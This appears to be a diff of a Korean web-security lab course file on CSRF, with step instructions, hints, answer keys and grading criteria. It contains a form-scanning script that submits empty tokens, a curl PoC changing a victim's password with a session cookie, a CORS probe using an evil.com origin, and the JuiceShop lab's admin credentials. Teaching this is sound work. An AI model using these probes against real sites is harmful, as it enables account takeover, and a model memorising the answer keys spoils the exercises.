+    | **Angular** | HttpClientXsrfModule (자동) | `XSRF-TOKEN` 쿠키 → `X-XSRF-TOKEN` 헤더 | Double Submit |
+
+    ▶ 2단계: 도구 A — 각 프레임워크 default 검증
+    ```bash
+    # Django 샘플 검증
+    curl -s http://django-app/login | grep -ioE 'csrfmiddlewaretoken[^"]*"[^"]*"'
+    # Rails
+    curl -s http://rails-app/login | grep -ioE 'authenticity_token[^"]*"[^"]*"'
+    # Laravel
+    curl -s http://laravel-app/login | grep -ioE '_token[^"]*"[^"]*"'
+    ```
+
+    ▶ 3단계: 도구 B — semgrep 으로 CSRF 비활성 코드 탐지
+    ```bash
+    semgrep --config p/csrf ./src/
+    # Django: csrf_exempt decorator 사용 시 경고
+    # Spring: .csrf().disable() 시 경고
+    # Express: csurf 미설치 + state-changing route 경고
+    ```
+
+    ▶ 4단계: 도구 C — RetireJS / npm audit (라이브러리 취약점)
+    ```bash
+    npm audit
+    # csurf, express-csrf 등의 알려진 CVE 확인
+    ```
+
+    ▶ 5단계: 권장 (모든 프레임워크 공통)
+    ```
+    1. CSRF middleware 항상 활성 (default)
+    2. Cookie 에 SameSite=Strict + Secure + HttpOnly
+    3. JSON API 는 Content-Type application/json 강제
+    4. 모든 state-changing route 에 토큰 검증
+    5. CI/CD 에 csrf scan 통합 (OWASP ZAP / Burp / nuclei)
+    ```
+
+    ▶ 6단계: 답변
+    프레임워크 2개 활성화 코드 quote + 토큰 위치 + 권장 사항 1 문장.
+  hint: '7 프레임워크 비교표 / curl + grep / semgrep p/csrf / npm audit / 공통 권장 5종.'
   category: csrf_defense
   points: 10
   answer: 'echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo ''Spring:
@@ -353,8 +970,77 @@ steps:
       - 내장 방어 맥락 없음
   target_vm: attacker
 - order: 13
-  instruction: CSRF 취약점 자동 탐지 방법을 구현하시오.
-  hint: 폼의 토큰 유무를 자동 확인하세요.
+  instruction: |-
+    CSRF 취약점 자동 탐지 방법을 구현하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — Python 자동 탐지 스크립트 (form 분석)
+    ```python
+    #!/usr/bin/env python3
+    import requests, re, sys
+    from bs4 import BeautifulSoup
+    from urllib.parse import urljoin
+
+    def find_csrf_issues(base_url):
+        r = requests.get(base_url)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        issues = []
+        for form in soup.find_all('form'):
+            action = urljoin(base_url, form.get('action', ''))
+            method = form.get('method', 'get').lower()
+            if method != 'post':
+                continue  # GET은 보통 CSRF 무관
+            # 토큰 검색
+            has_token = bool(form.find('input', {'name': re.compile(r'csrf|token|_token|authenticity', re.I)}))
+            if not has_token:
+                issues.append(f"[VULN] {action} POST 폼에 CSRF 토큰 없음")
+            else:
+                # 토큰 존재 → 빈 값 시도
+                form_data = {i.get('name'): 'test' for i in form.find_all('input') if i.get('name')}
+                form_data['_token'] = ''  # 빈 토큰
+                resp = requests.post(action, data=form_data, cookies=r.cookies)
+                if resp.status_code == 200:
+                    issues.append(f"[VULN] {action} 빈 토큰 허용")
+        return issues
+
+    for issue in find_csrf_issues(sys.argv[1]):
+        print(issue)
+    print("자동 탐지 완료")
+    ```
+
+    ▶ 2단계: 도구 B — OWASP ZAP CSRF Tester
+    ```bash
+    # CLI
+    docker run -t owasp/zap2docker-stable zap-baseline.py \
+      -t http://10.20.30.80 -r csrf-report.html -m 5 \
+      --config rule.40009.threshold=MEDIUM  # CSRF 룰 활성
+    ```
+
+    ▶ 3단계: 도구 C — Burp Active Scan + CSRF
+    1. Settings → Scan engine → Custom rules
+    2. CSRF 룰 activated 확인
+    3. Active Scan 실행 → Issue 목록에서 "Cross-site request forgery" 자동 식별
+
+    ▶ 4단계: 도구 D — nuclei CSRF 템플릿
+    ```bash
+    nuclei -u http://10.20.30.80 -t http/vulnerabilities/generic/csrf-detect.yaml -silent
+    ```
+
+    ▶ 5단계: CI/CD 통합 (.github/workflows/security.yml)
+    ```yaml
+    - name: CSRF scan
+      run: |
+        docker run --rm -t owasp/zap2docker-stable zap-baseline.py \
+          -t ${{ secrets.STAGING_URL }} \
+          --config rule.40009.threshold=MEDIUM \
+          -J zap-report.json
+        # 발견 시 Pull Request 차단
+    ```
+
+    ▶ 6단계: 답변
+    Python 스크립트 핵심 출력 (`[VULN] ... 토큰 없음`) quote + 자동화 효과 (M form × N 패턴) + CI/CD 통합 1 문장.
+  hint: 'Python BS form 분석 / OWASP ZAP / Burp Active Scan / nuclei csrf-detect / CI/CD GitHub Actions.'
   category: csrf_tool
   points: 10
   answer: 'echo ''자동 CSRF 탐지: 폼 분석 -> 토큰 검사 -> 결과'' && echo ''자동 탐지 완료'''
@@ -380,8 +1066,79 @@ steps:
       - 자동화 맥락 없음
   target_vm: attacker
 - order: 14
-  instruction: CSRF 방어 권고사항을 종합 정리하시오.
-  hint: 토큰, SameSite, Referer 검증 등을 포함하세요.
+  instruction: |-
+    CSRF 방어 권고사항을 종합 정리하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 5층 방어 (defense in depth)
+    ```
+    Layer 1: SameSite Cookie (1차 방어)
+      - SameSite=Strict (모든 cross-site 차단)
+      - Secure + HttpOnly + __Host- prefix
+
+    Layer 2: CSRF 토큰 (2차 방어)
+      - Synchronizer Token Pattern (서버 세션) 또는
+      - Double Submit Cookie (stateless)
+      - Origin/Referer 부가 검증
+
+    Layer 3: Custom Header 요구
+      - X-Requested-With: XMLHttpRequest
+      - 또는 X-CSRF-TOKEN
+      - 브라우저가 cross-origin 에서 custom header 못 보냄 (preflight 발생)
+
+    Layer 4: CORS 엄격
+      - Access-Control-Allow-Origin: 화이트리스트 (와일드카드 X)
+      - Access-Control-Allow-Credentials: true 와 결합 금지
+
+    Layer 5: 사용자 재인증 (high-risk action)
+      - 패스워드 변경 / 송금 시 현재 패스워드 재입력
+      - 2FA / step-up authentication
+    ```
+
+    ▶ 2단계: 도구 A — Mozilla Observatory 자동 등급
+    ```bash
+    pip install httpobs-cli
+    httpobs-cli http://10.20.30.80
+    # CSRF 관련 점수 확인
+    ```
+
+    ▶ 3단계: 도구 B — Spring Security CSRF 설정 예
+    ```java
+    http.csrf(csrf -> csrf
+        .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
+        .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
+        .ignoringRequestMatchers("/api/public/**")
+    )
+    ```
+
+    ▶ 4단계: 도구 C — Django settings.py
+    ```python
+    # 활성화 (기본 ON)
+    MIDDLEWARE = ['django.middleware.csrf.CsrfViewMiddleware', ...]
+    CSRF_COOKIE_SECURE = True
+    CSRF_COOKIE_HTTPONLY = False  # JS 가 읽어야 헤더로 복사
+    CSRF_COOKIE_SAMESITE = 'Strict'
+    CSRF_TRUSTED_ORIGINS = ['https://victim.com']  # 화이트리스트
+    ```
+
+    ▶ 5단계: 도구 D — Express csurf 설정
+    ```javascript
+    const csurf = require('csurf');
+    const csrfProtection = csurf({
+      cookie: {
+        sameSite: 'strict',
+        secure: true,
+        httpOnly: false,
+      }
+    });
+    app.use(csrfProtection);
+    app.get('/form', (req, res) => res.render('form', {csrfToken: req.csrfToken()}));
+    ```
+
+    ▶ 6단계: 답변
+    각 layer 1줄 + 도구 1개 설정 코드 quote + OWASP CSRF Prevention Cheatsheet 참조.
+  hint: '5층 방어 / Mozilla Observatory / Spring/Django/Express 설정 코드 / OWASP Cheatsheet.'
   category: csrf_defense
   points: 12
   answer: echo '=== CSRF 방어 권고 ===' && echo '1. CSRF 토큰 적용' && echo '2. SameSite=Strict'
@@ -408,8 +1165,84 @@ steps:
       - 토큰만 의존
   target_vm: attacker
 - order: 15
-  instruction: CSRF 실습 종합 보고서를 작성하시오.
-  hint: 발견 취약점, PoC, 방어 권고를 포함하세요.
+  instruction: |-
+    CSRF 실습 종합 보고서를 작성하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 자동 보고서 생성
+    ```bash
+    REPORT=~/csrf-week04-$(date +%F).md
+    cat > $REPORT <<EOF
+    # CSRF 점검 보고서
+    대상: http://10.20.30.80 / 일자: $(date -Iseconds) / 점검자: $(whoami)
+
+    ■ 1. 발견 사항
+    ▶ 1.1 토큰 누락 폼
+    $(python3 -c "
+    import requests, re
+    from bs4 import BeautifulSoup
+    r = requests.get('http://10.20.30.80')
+    soup = BeautifulSoup(r.text, 'html.parser')
+    for f in soup.find_all('form', method='post'):
+        if not f.find('input', {'name': re.compile(r'csrf|token', re.I)}):
+            print(f'- {f.get(\"action\")}')
+    ")
+
+    ▶ 1.2 SameSite 미설정 쿠키
+    \`\`\`
+    $(curl -sI http://10.20.30.80 | grep -i 'set-cookie' | grep -v -i 'samesite')
+    \`\`\`
+
+    ▶ 1.3 CORS 위험 패턴
+    \`\`\`
+    $(curl -sI -H 'Origin: http://evil.com' http://10.20.30.80 | grep -iE 'access-control')
+    \`\`\`
+
+    ■ 2. PoC 재현
+    \`\`\`bash
+    # 패스워드 변경 CSRF
+    curl -X POST -b 'session=VICTIM_COOKIE' http://10.20.30.80/profile -d 'password=hacked'
+    # 응답: 200 OK (방어 미작동)
+    \`\`\`
+
+    ■ 3. 위험도
+    | 항목 | 위험도 | CWE |
+    |---|---|---|
+    | CSRF 토큰 미적용 | High | CWE-352 |
+    | SameSite 미설정 | Medium | CWE-352 |
+    | CORS 반사 | High | CWE-942 |
+
+    ■ 4. 권고 (우선순위)
+    1. **즉시**: 모든 POST 폼에 CSRF 토큰 추가
+    2. **즉시**: \`SameSite=Strict\` + \`Secure\` + \`HttpOnly\` 쿠키 속성
+    3. **단기**: CORS 화이트리스트 (와일드카드 제거)
+    4. **중기**: 고위험 작업 재인증 / 2FA
+    5. **장기**: CI/CD 에 OWASP ZAP CSRF 스캔 통합
+
+    ■ 5. 사용 도구
+    - curl (PoC 작성)
+    - Python BeautifulSoup (폼 자동 분석)
+    - Burp Suite (Generate CSRF PoC)
+    - OWASP ZAP (자동 점검)
+    - nuclei (csrf-detect 템플릿)
+
+    ■ 6. 윤리·법적 진술
+    - 허가 범위: 사전 서면 허가 host (10.20.30.80) only
+    - 점검 단계: CSRF 식별 + PoC 작성. 실 사용자 영향 X
+    - 로그 보존: 24개월
+    EOF
+
+    sha256sum $REPORT > $REPORT.sha256
+    cat $REPORT
+    echo "보고서 완료"
+    ```
+
+    ▶ 2단계: 도구 — DefectDojo (Finding 관리, 이전 lab 동일)
+
+    ▶ 3단계: 답변
+    보고서 핵심 1~2 섹션 quote + sha256 + 사용 도구 list.
+  hint: '자동 보고서 통합 (Python + curl) / 위험도 표 / 권고 우선순위 / sha256 / 윤리.'
   category: verification
   points: 8
   answer: 'echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo
@@ -439,48 +1272,85 @@ steps:
       - 권고 단순
   target_vm: attacker
 - order: 99
-  instruction: |
-    [복합 시나리오] "인증 방식 × CSRF 방어 매트릭스 — JWT/Session × SameSite/Token/CORS"
+  instruction: '[복합 시나리오] "인증 방식 × CSRF 방어 매트릭스 — JWT/Session × SameSite/Token/CORS"
 
-    ## 상황 (w03 → w04 시나리오 연속)
+
+    ■ 상황 (w03 → w04 시나리오 연속)
+
 
     w03 에서 CSP 미설정 → XSS reflection 까지 봤다. 선배가 다음 단계.
 
-    > 선배: "이번 주는 인증·세션이야. JuiceShop 은 JWT 쓰는데, 어떤 사이트는 Cookie+Session 이지.
-    > 인증 방식이 다르면 CSRF 방어 전략도 달라져. JWT 는 Authorization 헤더라 CSRF 가 자동으론 안 박혀.
-    > Cookie 면 SameSite/CSRF token 이 필수고. 토큰 분석한 다음 CSRF PoC 시도하고,
-    > 인증방식 × 방어수단 매트릭스 만들어. 그게 점검 보고서의 핵심이야."
 
-    학습 목표 (lecture #1 인증 + #3 세션 + #4 JWT) + (lab #1 토큰 + #5 SameSite + #6 토큰 약점) 통합.
+    ※ 선배: "이번 주는 인증·세션이야. JuiceShop 은 JWT 쓰는데, 어떤 사이트는 Cookie+Session 이지.
 
-    ## 임무 (3 단계, 약 35분)
+    ※ 인증 방식이 다르면 CSRF 방어 전략도 달라져. JWT 는 Authorization 헤더라 CSRF 가 자동으론 안 박혀.
+
+    ※ Cookie 면 SameSite/CSRF token 이 필수고. 토큰 분석한 다음 CSRF PoC 시도하고,
+
+    ※ 인증방식 × 방어수단 매트릭스 만들어. 그게 점검 보고서의 핵심이야."
+
+
+    학습 목표 (lecture #1 인증 + #3 세션 + #4 JWT) + (lab #1 토큰 + #5 SameSite + #6 토큰 약점)
+    통합.
+
+
+    ■ 임무 (3 단계, 약 35분)
+
 
     Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
 
-    ### Phase A — JWT 토큰 분석 (lecture #1·#4)
-    `curl -s -i -X POST -H "Content-Type: application/json"
-    -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.30.80/rest/user/login`
-    응답에서 JWT 추출. `echo "<JWT>" | cut -d. -f2 | base64 -d` 로 payload decode. alg/iat/exp 확인.
 
-    ### Phase B — CSRF PoC + SameSite 비교 (lab #1·#2·#5)
+    ▶ Phase A — JWT 토큰 분석 (lecture #1·#4)
+
+    `curl -s -i -X POST -H "Content-Type: application/json"
+
+    -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' http://10.20.30.80/rest/user/login`
+
+    응답에서 JWT 추출. `echo "<JWT>" | cut -d. -f2 | base64 -d` 로 payload decode. alg/iat/exp
+    확인.
+
+
+    ▶ Phase B — CSRF PoC + SameSite 비교 (lab #1·#2·#5)
+
     JuiceShop 은 JWT-Header 방식이라 *전형적 CSRF 자동발동 안 됨* — 이 자체가 학습 포인트.
+
     가상 Cookie 사이트 가정 패스워드 변경 위조 HTML 작성 (`<form>` + auto submit script).
+
     SameSite=Strict / Lax / None 3 케이스 영향 비교.
 
-    ### Phase C — 인증방식 × CSRF 방어 매트릭스
+
+    ▶ Phase C — 인증방식 × CSRF 방어 매트릭스
+
     | 인증방식 | CSRF 자동발동 | 권장 방어 | 비고 |
+
     | Session Cookie | 가능 | CSRF Token + SameSite=Lax | Double Submit |
+
     | JWT in Cookie | 가능 | CSRF Token + SameSite=Strict | 비추천 |
+
     | JWT in Header | 불가 | CORS + Origin 검증 | 권장 |
+
     | OAuth2 PKCE | 부분 | state 파라미터 | code intercept 방어 |
+
     표 끝에 "JuiceShop = JWT-Header → CORS·Origin 검증 권고" 한 줄.
 
-    종료: echo "=== Phase A JWT decode ===" / "=== Phase B SameSite ===" / "=== Phase C 매트릭스 ===".
-  hint: |
-    Phase A: JWT 3분할 (cut -d. -f2). payload base64-d 하면 JSON.
+
+    종료: echo "=== Phase A JWT decode ===" / "=== Phase B SameSite ===" / "=== Phase
+    C 매트릭스 ===".
+
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain —
+    정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로
+    답변에 직접 quote** 해야 채점 통과.'
+  hint: 'Phase A: JWT 3분할 (cut -d. -f2). payload base64-d 하면 JSON.
+
     Phase B: JuiceShop JWT-Header 라 PoC 가 작동 안 함 — 그게 결론.
+
     Phase C: 4행 매트릭스. JuiceShop 위치 명시.
+
     포인트: 인증방식별 CSRF 위협 모델 차이.
+
+    '
   category: integration_scenario
   points: 50
   verify:
@@ -488,9 +1358,11 @@ steps:
     expect: 매트릭스
     field: stdout
     semantic:
-      intent: |
-        JWT 토큰 분석 → CSRF PoC + SameSite → 인증방식 × 방어 매트릭스.
+      intent: 'JWT 토큰 분석 → CSRF PoC + SameSite → 인증방식 × 방어 매트릭스.
+
         lecture #1·#3·#4 + lab #1·#5·#6 동시 행동 증명.
+
+        '
       success_criteria:
       - Phase A — JWT 추출 + payload decode (alg/exp)
       - Phase B — CSRF PoC HTML + SameSite 3 케이스
@@ -507,6 +1379,9 @@ steps:
       - JuiceShop JWT-Header 분석 누락
   target_vm: attacker
   risk_level: low
-  answer_detail: |
-    학생이 ssh attacker 후 curl/cut/base64 직접. JuiceShop 은 admin@juice-sh.op / admin123 admin 계정.
+  answer_detail: '학생이 ssh attacker 후 curl/cut/base64 직접. JuiceShop 은 admin@juice-sh.op
+    / admin123 admin 계정.
+
     JWT 는 alg=HS256, JWT-Header 방식이라 CSRF 자동발동 안 됨 — 그 사실 자체가 학습 결과.
+
+    '
